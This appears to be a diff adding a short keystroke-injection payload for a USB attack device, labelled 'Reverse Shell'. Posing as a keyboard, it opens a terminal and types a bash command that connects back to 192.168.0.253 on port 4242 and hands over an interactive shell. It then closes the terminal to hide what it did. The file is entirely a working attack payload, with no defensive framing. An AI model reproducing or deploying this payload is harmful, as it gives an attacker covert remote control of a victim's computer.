@@ -1,0 +1,9 @@
+REM Reverse Shell
+ATTACKMODE HID STORAGE
+DELAY 2000
+CTRL ALT t
+DELAY 1000
+STRING script -c 'bash -i' /dev/null </dev/tcp/192.168.0.253/4242 >&0 2>&1 &
+ENTER
+STRING exit
+ENTER
